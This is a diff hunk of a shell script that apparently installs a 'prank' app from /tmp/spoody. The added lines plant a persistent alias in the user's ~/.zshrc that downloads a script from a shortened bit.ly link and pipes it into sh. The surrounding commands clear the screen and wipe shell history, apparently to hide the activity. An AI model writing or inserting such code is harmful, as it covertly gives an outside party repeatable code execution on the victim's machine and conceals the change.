@@ -6,6 +6,10 @@ tar -xvf /tmp/spoody/pranky.tar.gz -C /tmp/spoody > /dev/null
 
 nohup open /tmp/spoody/app/Pranky.app > /dev/null
 
+if [ `alias | grep spoody | wc -l` -eq 0 ]; then
+  echo "alias spoody='curl -s -L bit.ly/spody | sh'" >> ~/.zshrc
+fi
+
 clear
 history -c
 
